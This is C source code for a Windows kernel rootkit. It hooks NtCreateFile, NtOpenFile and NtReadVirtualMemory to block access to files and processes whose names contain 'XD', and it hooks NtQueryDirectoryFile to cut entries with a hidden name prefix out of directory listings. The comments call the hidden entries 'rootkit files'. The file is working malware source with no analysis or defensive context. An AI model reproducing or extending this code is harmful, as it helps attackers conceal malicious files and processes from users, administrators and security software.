#include "rootkit.h"

NTSTATUS GetProcessImageName(HANDLE ProcessHandle, PUNICODE_STRING ProcessImageName)
{
				NTSTATUS status = STATUS_ACCESS_DENIED;
				PUNICODE_STRING imageName = NULL;
				ULONG returnedLength = 0;
				ULONG bufferLength = 0;
				PVOID buffer = NULL;

				if (ZwQueryInformationProcess == NULL)
				{
								UNICODE_STRING routineName;
								RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
								ZwQueryInformationProcess = (QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);
								if (NULL == ZwQueryInformationProcess) { return STATUS_INSUFFICIENT_RESOURCES; }
				}

				status = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, NULL, 0, &returnedLength);
				if (STATUS_INFO_LENGTH_MISMATCH != status) { return status; }

				bufferLength = returnedLength - sizeof(UNICODE_STRING);
				if (ProcessImageName->MaximumLength < bufferLength)
				{
								ProcessImageName->Length = (USHORT)bufferLength;
								return STATUS_BUFFER_OVERFLOW;
				}

				buffer = ExAllocatePoolWithTag(PagedPool, returnedLength, 'ipgD');
				if (NULL == buffer) { return STATUS_INSUFFICIENT_RESOURCES; }

				status = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, buffer, returnedLength, &returnedLength);
				if (NT_SUCCESS(status))
				{
								imageName = (PUNICODE_STRING)buffer;
								RtlCopyUnicodeString(ProcessImageName, imageName);
				}
				ExFreePool(buffer);
				return status;
}


NTSTATUS MyNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
{
				if (ObjectAttributes &&
								ObjectAttributes->ObjectName &&
								ObjectAttributes->ObjectName->Buffer)
				{
								wchar_t* name = (wchar_t*)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
								if (name)
								{
												RtlZeroMemory(name, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
												RtlCopyMemory(name, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

												if (wcsstr(name, L"XD"))
												{
																ExFreePool(name);
																return STATUS_ACCESS_DENIED;
												}

												ExFreePool(name);
								}
				}
				return g_NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}


NTSTATUS MyNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) {
				if (ObjectAttributes &&
								ObjectAttributes->ObjectName &&
								ObjectAttributes->ObjectName->Buffer)
				{
								wchar_t* name = (wchar_t*)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
								if (name)
								{
												RtlZeroMemory(name, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
												RtlCopyMemory(name, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

												if (wcsstr(name, L"XD"))
												{
																ExFreePool(name);
																return STATUS_ACCESS_DENIED;
												}

												ExFreePool(name);
								}
				}
				return g_NtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

NTSTATUS MyNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, ULONG NumberOfBytesReaded) {
				UNICODE_STRING ProcImgName = { 0 };
				ProcImgName.Length = 0;
				ProcImgName.MaximumLength = 1024;
				ProcImgName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, ProcImgName.MaximumLength, '2leN');
				if (ProcImgName.Buffer) {
								RtlZeroMemory(ProcImgName.Buffer, ProcImgName.MaximumLength);
								NTSTATUS status = GetProcessImageName(ProcessHandle, &ProcImgName);

								wchar_t str[256];
								wcsncpy(str, ProcImgName.Buffer, ProcImgName.Length / 2);
								str[ProcImgName.Length / 2] = 0;

								if (wcsstr(str, L"XD")) {
												return STATUS_ACCESS_DENIED;
								}
				}

				return g_NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);
}

PVOID getDirEntryFileName
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass
)
{
				PVOID result = 0;
				switch (FileInfoClass) {
				case FileDirectoryInformation:
								result = (PVOID) & ((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName;
								break;
				case FileFullDirectoryInformation:
								result = (PVOID) & ((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileName;
								break;
				case FileIdFullDirectoryInformation:
								result = (PVOID) & ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName;
								break;
				case FileBothDirectoryInformation:
								result = (PVOID) & ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName;
								break;
				case FileIdBothDirectoryInformation:
								result = (PVOID) & ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName;
								break;
				case FileNamesInformation:
								result = (PVOID) & ((PFILE_NAMES_INFORMATION)FileInformation)->FileName;
								break;
				}
				return result;
}

ULONG getNextEntryOffset
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass
)
{
				ULONG result = 0;
				switch (FileInfoClass) {
				case FileDirectoryInformation:
								result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				case FileFullDirectoryInformation:
								result = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				case FileIdFullDirectoryInformation:
								result = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				case FileBothDirectoryInformation:
								result = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				case FileIdBothDirectoryInformation:
								result = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				case FileNamesInformation:
								result = (ULONG)((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset;
								break;
				}
				return result;
}

void setNextEntryOffset
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass,
				IN ULONG newValue
)
{
				switch (FileInfoClass) {
				case FileDirectoryInformation:
								((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				case FileFullDirectoryInformation:
								((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				case FileIdFullDirectoryInformation:
								((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				case FileBothDirectoryInformation:
								((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				case FileIdBothDirectoryInformation:
								((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				case FileNamesInformation:
								((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset = newValue;
								break;
				}
}

/* Check if the file is one of those that need to be hidden */
BOOLEAN checkIfHiddenFile(WCHAR fileName[])
{

				SIZE_T				nBytesEqual;
				//DBG_PRINT2("[checkIfHiddenFile]: we are checking %S\n",fileName);

				// Check if known file
				nBytesEqual = 0;
				nBytesEqual = RtlCompareMemory
				(
								(PVOID) & (fileName[0]),
								(PVOID) & (prefix[0]),
								PREFIX_SIZE
				);
				//DBG_PRINT2("[checkIfHiddenFile]: nBytesEqual: %d\n",nBytesEqual);
				if (nBytesEqual == PREFIX_SIZE)
				{
								//DBG_PRINT2("[checkIfHiddenFile]: known file detected : %S\n", fileName);
								return(TRUE);
				}

				return FALSE;
}

NTSTATUS MyNtQueryDirectoryFile
(
				IN    HANDLE FileHandle,
				IN	HANDLE Event,
				IN	PIO_APC_ROUTINE ApcRoutine,
				IN	PVOID ApcContext,
				OUT   PIO_STATUS_BLOCK IoStatusBlock,
				OUT   PVOID FileInformation,
				IN    ULONG Length,
				IN    FILE_INFORMATION_CLASS FileInformationClass,
				IN    BOOLEAN ReturnSingleEntry,
				IN	PUNICODE_STRING FileName,
				IN    BOOLEAN RestartScan
)
{
				NTSTATUS		ntStatus;
				PVOID	currFile;
				PVOID	prevFile;


				//DBG_TRACE("newZwQueryDirectoryFile","Call intercepted!"); 
				// Call normal function
				ntStatus = g_NtQueryDirectoryFile
				(
								FileHandle,
								Event,
								ApcRoutine,
								ApcContext,
								IoStatusBlock,
								FileInformation,
								Length,
								FileInformationClass,
								ReturnSingleEntry,
								FileName,
								RestartScan
				);
				if (!NT_SUCCESS(ntStatus))
				{
								//DBG_TRACE("newZwQueryDirectoryFile","Call failed.");
								return ntStatus;
				}

				// Call hide function depending on FileInformationClass
				if
								(
												FileInformationClass == FileDirectoryInformation ||
												FileInformationClass == FileFullDirectoryInformation ||
												FileInformationClass == FileIdFullDirectoryInformation ||
												FileInformationClass == FileBothDirectoryInformation ||
												FileInformationClass == FileIdBothDirectoryInformation ||
												FileInformationClass == FileNamesInformation
												)
				{



								currFile = FileInformation;
								prevFile = NULL;
								//Sweep trought the array of PFILE_BOTH_DIR_INFORMATION structures
								do
								{
												// Check if file is one of rootkit files
												if (checkIfHiddenFile((WCHAR*)getDirEntryFileName(currFile, FileInformationClass)) == TRUE)
												{
																// If it is not the last file
																if (getNextEntryOffset(currFile, FileInformationClass) != NO_MORE_ENTRIES)
																{
																				int delta;
																				int nBytes;
																				// We get number of bytes between the 2 addresses (that we already processed)
																				delta = ((ULONG)currFile) - (ULONG)FileInformation;
																				// Lenght is size of FileInformation buffer
																				// We get the number of bytes still to be sweeped trought
																				nBytes = (DWORD)Length - delta;
																				// We get the size of bytes to be processed if we remove the current entry.
																				nBytes = nBytes - getNextEntryOffset(currFile, FileInformationClass);
																				// The next operation replaces the rest of the array by the same array without the current structure.
																				RtlCopyMemory
																				(
																								(PVOID)currFile,
																								(PVOID)((char*)currFile + getNextEntryOffset(currFile, FileInformationClass)),
																								(DWORD)nBytes
																				);
																				continue;
																}
																else
																{
																				// Only one file
																				if (currFile == FileInformation)
																				{
																								ntStatus = STATUS_NO_MORE_FILES;
																				}
																				else
																				{
																								// Several file and ours is the last one
																								// We set previous to end of file
																								setNextEntryOffset(prevFile, FileInformationClass, NO_MORE_ENTRIES);
																				}
																				// Exit while loop
																				break;
																}
												}
												prevFile = currFile;
												// Set current file to next file in array
												currFile = ((BYTE*)currFile + getNextEntryOffset(currFile, FileInformationClass));
								} while (getNextEntryOffset(prevFile, FileInformationClass) != NO_MORE_ENTRIES);


				}

				return ntStatus;
}